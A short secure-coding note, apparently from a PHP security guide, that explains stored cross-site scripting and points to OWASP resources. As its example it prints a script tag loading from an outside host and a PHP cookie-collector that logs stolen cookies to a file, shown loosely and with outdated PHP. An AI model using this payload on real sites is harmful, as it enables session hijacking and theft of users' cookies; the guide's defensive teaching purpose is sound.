# PHP Stored Anti-pattern

Avoid stored Cross site script by validating input that attempts to save
or store a XSS code in the database. You can use the OWASP PHP Security
Framework to validate any attempt to submit information to the database
when an malicious user attempts to submit information which contains XSS
code.

Websites that do not validate properly XSS code that can be stored, are
vulnerable to Cookie stealing sessions

Example, a malicious user will submit the following code in a (text)
input field that does not validate input

<script src="http://192.168.120.20/stealcookie.php">

</script>

<?php
     $cookie = $HTTP_GET_VARS["cookie"];
     $file = fopen('cookiesteal.txt', 'a');
     fwrite($file, $cookie . "\n\n");
   ?>

And through this simple script, the user will be able to get the cookies
delivered to his server.

## OWASP XSS Cheat sheets

To get an overview of potential XSS code that can be maliciously
submitted through web forms, use the OWASP XSS Cheat sheets online to
test and determined potential vulnerabilities.
<https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>

## OWASP PHP Security Framework

To protect your site against these type of attacks you can implement the
OWASP PHP security libraries in the php applcation, visit
<https://www.owasp.org/index.php/OWASP_PHP_Security_Project>